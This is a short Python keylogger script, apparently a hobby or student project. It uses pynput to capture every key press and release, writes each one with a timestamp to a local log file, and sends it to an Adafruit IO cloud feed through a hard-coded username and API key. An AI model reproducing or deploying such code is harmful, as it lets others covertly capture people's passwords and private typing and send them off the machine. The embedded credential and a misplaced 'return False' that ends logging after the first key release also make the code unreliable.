### Versão Firebase 
from pynput import keyboard
from Adafruit_IO import Client,Data,Feed
import datetime

logNumber = 0 

aio = Client("goncalobraga27","aio_LbfZ36Fskc3foUKywgkWURyNKWFa")

f = open('loggerKeyboard.txt', 'a') 
def get_current_time():
    now = datetime.datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

#detect key press
def on_press(key):
    global logNumber
    try:
        print('alphanumeric key {0} pressed'.format(str(key.char)))
        log = get_current_time() + '|' + "AlphaNumeric Key Pressed" + '|' + str(key.char) + '\n'
        f.write(log)
        feed = aio.feeds('sensorfeed')
        aio.send_data(feed.key,log)
        
    except:
        print('special key {0} pressed'.format(str(key)))
        log = get_current_time() + '|' + "Special Key Pressed" + '|' + str(key) + '\n'
        f.write(log)
        feed = aio.feeds('sensorfeed')
        aio.send_data(feed.key,log)
        

#detect key releases
def on_release(key):
    global logNumber
    print('{0} released'.format(str(key)))
    log = get_current_time() + '|' + "Key Released" + '|' + str(key) + '\n'
    f.write(log)
    feed = aio.feeds('sensorfeed')
    aio.send_data(feed.key,log)
    if key == keyboard.Key.esc:
    #stop listener
        print('Gracefully Stopping!')
    return False

#collecting events
with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()

f.close()